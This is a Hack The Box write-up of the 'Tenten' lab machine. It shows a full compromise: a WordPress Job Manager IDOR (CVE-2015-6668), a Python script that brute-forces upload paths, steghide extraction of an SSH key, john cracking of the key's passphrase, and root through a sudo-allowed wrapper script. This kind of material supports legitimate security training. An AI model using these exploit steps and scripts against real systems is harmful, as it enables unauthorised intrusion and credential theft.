---
clayout: ctf
title: Tenten
date: 2025-09-16
image: /ctf/hack-the-box/machines/tenten/info-card.png
type: Hack The Box

ctf:
    - name: Tenten
      link: https://app.hackthebox.com/machines/8
      thumbnail: /ctf/hack-the-box/machines/tenten/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/8
          thumbnail: /ctf/hack-the-box/machines/tenten/pwned.png
---

## Machine Overview

A WordPress instance (tenten.htb) runs the Job Manager plugin (≤ 0.7.25), which is vulnerable to an IDOR and allows discovery of an uploaded CV image containing a private SSH key embedded via steganography. The private key is encrypted; its passphrase is recovered with `john` and used to SSH as `takis`. A misconfigured sudo entry for `/bin/fuckin` allows immediate root escalation.

## Enumeration

### Nmap

We started with a standard service scan to discover open services and versions:

```bash
nmap -sC -sV -Pn -oN nmap.txt 10.10.10.10
```

**Scan results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ecf79d380c476ff0130fb93bd4d6e311 (RSA)
|   256 ccfe2de27fef4d41ae390e91ed7e9de7 (ECDSA)
|_  256 8db58318c07c5d3d38df4be1a4828a07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://tenten.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## Web Enumeration

### Hostname

Port 80 redirected to the virtual host `tenten.htb`. Added an `/etc/hosts` entry:

```bash
echo "10.10.10.10 tenten.htb" | sudo tee -a /etc/hosts
```

### Web Application Inspection

Visiting `http://tenten.htb/` shows a WordPress site with one post (user `takis`) and a job listing.

![Tenten Home Page](/ctf/hack-the-box/machines/tenten/home.png)

### WordPress plugin scan

Using `wpscan` revealed an instance of Job Manager with a known vulnerability:

```bash
wpscan --url http://tenten.htb --api-token <API_TOKEN>
```

```bash
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference (IDOR)
 |     References:
 |      - https://wpscan.com/vulnerability/9fd14f37-8c45-46f9-bcb6-8613d754dd1c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
```

## Exploitation: IDOR → Find uploaded CV

### Manual verification

Job application pages use numeric job IDs in the URL pattern:

```url
http://tenten.htb/index.php/jobs/apply/8/
```

Changing the ID to another value (e.g., `13`) reveals additional job entries (the `HackerAccessGranted` job), confirming the IDOR.

### Finding the uploaded file

The Job Manager upload naming leaks allow brute-forcing upload paths (uploads are typically stored under `wp-content/uploads/YYYY/MM/filename.ext`). We use this [gist](https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef) to search likely upload paths for `HackerAccessGranted` with common image extensions:

```python
# exploit.py
import requests
website = raw_input('Enter a vulnerable website: ')
filename = raw_input('Enter a file name:')
filename2 = filename.replace(" ", "-")
for year in range(2017,2019):
    for i in range(1,13):
        for extension in {'jpeg','png','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

Run:

```bash
python2 exploit.py
Enter a vulnerable website: http://tenten.htb
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

We've found the CV image.

![Tenten HackerAccessGranted](/ctf/hack-the-box/machines/tenten/hacker-access-granted.png)

## Extract private key from image

### Steganography extraction

Using `steghide`, we can extract the embedded data:

```bash
steghide extract -sf HackerAccessGranted.jpg
Enter passphrase: # enter empty passphrase
wrote extracted data to "id_rsa".
```

We've recovered a private SSH key.

## John the Ripper

We can use John the Ripper to crack the passphrase. Before that, we need to convert the private key into a crackable hash format.

### Convert private key to hash

Using `ssh2john.py`, we can convert the private key into a hash.

```bash
python3 ssh2john.py id_rsa > id_rsa.hash
```

We can now use John the Ripper to crack the passphrase.

### Run John

Using the `rockyou` wordlist, we can crack the passphrase.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Result:**

```bash
superpassword    (id_rsa)
```

## Initial access

With the extracted key and recovered passphrase:

```bash
ssh -i id_rsa takis@10.10.10.10
Enter passphrase for key 'id_rsa': # enter superpassword
```

On successful login, we can see that we're now logged in as `takis`.

```bash
takis@tenten:~$ id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),27(sudo),...
```

> [!IMPORTANT] User flag
> `/home/takis/user.txt`

## Privilege escalation (takis → root)

### Sudo rights

```bash
sudo -l
```

**Output:**

```bash
User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

Looking at the output, we can see that `/bin/fuckin` is listed as a NOPASSWD program.

### Inspect `/bin/fuckin`

The content of the script is:

```bash
cat /bin/fuckin
# #!/bin/bash
# $1 $2 $3 $4
```

This script simply executes its first argument as a command (with up to 3 args). Because it is allowed via sudo without a password, it allows arbitrary command execution as root:

```bash
sudo /bin/fuckin sudo su
# becomes a root shell
root@tenten:/home/takis# id
uid=0(root) gid=0(root) groups=0(root)
```

> [!NOTE] Root flag
> `/root/root.txt`
